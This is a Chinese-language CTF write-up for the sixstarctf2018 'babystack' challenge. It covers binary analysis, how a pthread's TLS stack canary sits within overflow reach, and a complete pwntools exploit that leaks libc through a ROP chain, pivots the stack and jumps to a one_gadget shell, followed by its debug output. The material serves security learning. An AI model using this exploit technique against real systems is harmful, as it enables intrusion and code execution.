# 考察点
- stack overflow WITH `NX enable`
- CRACK stack canary by OVERFLOW
- ROP2Leakinfo
- ROP2Exp

# 分析

```shell
➜  sixstarctf2018_babystack file bs 
bs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41e0dcc65d970cc20028e602bc589baf544bb4ad, stripped
➜  sixstarctf2018_babystack checksec bs 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/Stack/sixstarctf2018_babystack/bs'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
➜  sixstarctf2018_babystack ./bs

 #   #    ####    #####  ######
  # #    #    #     #    #
### ###  #          #    #####
  # #    #          #    #
 #   #   #    #     #    #
          ####      #    #

Welcome to babystack 2018!
How many bytes do you want to send?
3
asdasdas
It's time to say goodbye.
Bye bye
```

# IDA

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 result; // rax
  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF

  newthread[1] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts(byte_400C96);
  puts(" #   #    ####    #####  ######");
  puts("  # #    #    #     #    #");
  puts("### ###  #          #    #####");
  puts("  # #    #          #    #");
  puts(" #   #   #    #     #    #");
  puts("          ####      #    #");
  puts(byte_400C96);
  pthread_create(newthread, 0LL, start_routine, 0LL);// 开启新线程，启用 start routine ,
  if ( pthread_join(newthread[0], 0LL) )
  {
    puts("exit failure");
    result = 1LL;
  }
  else
  {
    puts("Bye bye");
    result = 0LL;
  }
  return result;
}
```

```c
// in new thread
void *__fastcall start_routine(void *a1)
{
  unsigned __int64 len; // [rsp+8h] [rbp-1018h]
  char buf_4104[4104]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned __int64 v4; // [rsp+1018h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf_4104, 0, 0x1000uLL);
  puts("Welcome to babystack 2018!");
  puts("How many bytes do you want to send?");
  len = setInputLen();     // 接受用户输入的内容，转为 long int 当作长度 len 使用
  if ( len <= 0x10000 )
  {
    readInput(0LL, buf_4104, len);              // overflow vuln
    puts("It's time to say goodbye.");
  }
  else
  {
    puts("You are greedy!");
  }
  return 0LL;
}
```

很明显存在一个，很大的空间 overflow，但当前的 start_routine 是在 `main->pthread_create` 创建的新线程中执行的。

程序开启了 stack canary，相应的新线程也需要开辟新的 TLS，其中就存放了 canary，TLS 原型：
```c
typedef struct
{
   void *tcb;        /* Pointer to the TCB.  Not necessarily the
               thread descriptor used by libpthread.  */
   dtv_t *dtv;
   void *self;       /* Pointer to the thread descriptor.  */
   int multiple_threads;
   int gscope_flag;
   uintptr_t sysinfo;
   uintptr_t stack_guard;
   uintptr_t pointer_guard;
   ...
} tcbhead_t;
```
[资料来源](https://www.openwall.com/lists/oss-security/2018/02/27/5)
> Our research revealed that glibc has a problem in TLS implementation for threads created with the help of pthread_create. Say that it is required to select TLS for a new thread. After allocating memory for the stack, glibc initializes TLS in upper addresses of this memory. On the x86-64 architecture considered here, the stack grows downward, putting TLS at the top of the stack. Subtracting a certain constant value from TLS, we obtain the value used by a new thread for the stack register. **The distance from TLS to the stack frame of the function that the argument passed to pthread_create is** `less than one page`（4KB）. 

不超过一页的话，妥妥的在这道题的可溢出范围内。

由于还开启了`FULL RELO` GOT变为只读。
思路：ROP 是重点，设法 Leak 出 libc 函数地址，随后使用 One_Gadget
1. 泄露 libc 使用 puts 函数
2. 计算函数基址，得到 one_gadget 地址，使用 read 进行写入，写入程序内存
3. 提交计算出来的地址
4. 附加 leave;ret gadget

```shell
gdb-peda$ vmmap 
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/pitta/workspace/pwn_learn/rec0rd/Stack/sixstarctf2018_babystack/bs
0x00601000         0x00602000         r--p      /home/pitta/workspace/pwn_learn/rec0rd/Stack/sixstarctf2018_babystack/bs
0x00602000         0x00603000     (*) rw-p      /home/pitta/workspace/pwn_learn/rec0rd/Stack/sixstarctf2018_babystack/bs
```

```shell
➜  sixstarctf2018_babystack one_gadget ./libc.so.6 
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```


# exp
```python
from pwn import  *

context.log_level = "debug"
pipe = process("./bs", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so.6")

writable_space = 0x602f00

puts_plt = 0x4007C0
read_plt = 0x4007E0
atol_GOT = 0x601ff0

pop_rsi_r15_ret = 0x400c01
pop_rdi_ret = 0x400c03
leave_ret = 0x400791

og_offset = 0x4527a

payload = '\x00' * 0x1010 + p64(writable_space-8)           # padding 到 rbp，随后 rbp 单位设置成写入后续 payload 写入的目标地址 -8，因为 leave 指令
payload += p64(pop_rdi_ret) + p64(atol_GOT) + p64(puts_plt) # puts(atol_GOT)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(writable_space) + p64(0) + p64(read_plt)
payload += p64(leave_ret)                                   # leave + ret 指令（mov rsp, rbp; pop rbp; pop rip）
payload = payload.ljust(0x2000, '\x00')

pipe.recvuntil("How many bytes do you want to send?\n")
pipe.sendline(str(0x2000))
pipe.send(payload)
pipe.recvuntil("It's time to say goodbye.\n")
leakInfo = u64(pipe.recv(6) + '\x00\x00') 
print("leak info: 0x%x\n" % leakInfo)
libcBase = leakInfo - libc.symbols['atol']
print("libc base address: 0x%x\n" % libcBase)
bin_sh = libc.search('/bin/sh').next()
system = libc.sym['system']


onegadget = libcBase + og_offset
print("one_gadget address: 0x%x\n" % onegadget)
pipe.send(p64(onegadget))

pipe.interactive()
```


```shell
➜  sixstarctf2018_babystack python ./exp.py
[+] Starting local process './bs' argv=['./bs']  env={'LD_PRELOAD': './libc.so.6'} : pid 39523
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/Stack/sixstarctf2018_babystack/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[DEBUG] Received 0xec bytes:
    '\n'
    ' #   #    ####    #####  ######\n'
    '  # #    #    #     #    #\n'
    '### ###  #          #    #####\n'
    '  # #    #          #    #\n'
    ' #   #   #    #     #    #\n'
    '          ####      #    #\n'
    '\n'
    'Welcome to babystack 2018!\n'
    'How many bytes do you want to send?\n'
[DEBUG] Sent 0x5 bytes:
    '8192\n'
[DEBUG] Sent 0x2000 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00001010  f8 2e 60 00  00 00 00 00  03 0c 40 00  00 00 00 00  │·.`·│····│··@·│····│
    00001020  f0 1f 60 00  00 00 00 00  c0 07 40 00  00 00 00 00  │··`·│····│··@·│····│
    00001030  03 0c 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00001040  01 0c 40 00  00 00 00 00  00 2f 60 00  00 00 00 00  │··@·│····│·/`·│····│
    00001050  00 00 00 00  00 00 00 00  e0 07 40 00  00 00 00 00  │····│····│··@·│····│
    00001060  91 07 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00001070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00002000
[DEBUG] Received 0x21 bytes:
    00000000  49 74 27 73  20 74 69 6d  65 20 74 6f  20 73 61 79  │It's│ tim│e to│ say│
    00000010  20 67 6f 6f  64 62 79 65  2e 0a b0 1e  86 b3 30 7f  │ goo│dbye│.···│··0·│
    00000020  0a                                                  │·│
    00000021
leak info: 0x7f30b3861eb0

libc base address: 0x7f30b382b000

one_gadget address: 0x7f30b387027a

[DEBUG] Sent 0x8 bytes:
    00000000  7a 02 87 b3  30 7f 00 00                            │z···│0···│
    00000008
[*] Switching to interactive mode

[*] Got EOF while reading in interactive
$ 
```

# 遗留问题
创建出新线程，其对应的的 tcbhead_t 结构存放在哪里？偏移怎么计算？
[知识点](https://www.openwall.com/lists/oss-security/2018/02/27/5)

[其他 writeup](https://vishnudevtj.github.io/notes/star-ctf-2018-babystack)
上边连接提到了新线程设置`tcbhead_t` 对应的系统调用`arch_prctl `,调用号 158，gdb下使用 catch syscall 158 可以在这个函数调用结束时通过查看 RSI 进而定位到 fs 寄存器，偏移0x28即可找到对应的 stack canary。笔者在主进程中确实捕获到了，但新线程的追到的结果好像不对，应该是调试手法问题..

>As the function is called on a different thread , the thread will have a new stack and the canary is placed on the thread local storage structure. and this structure will be on top of the stack which gives us a opportunity to overflow in this case .【并且这个新canary 的存放在线程的 local storage，偏移不超过一页（4kb）】
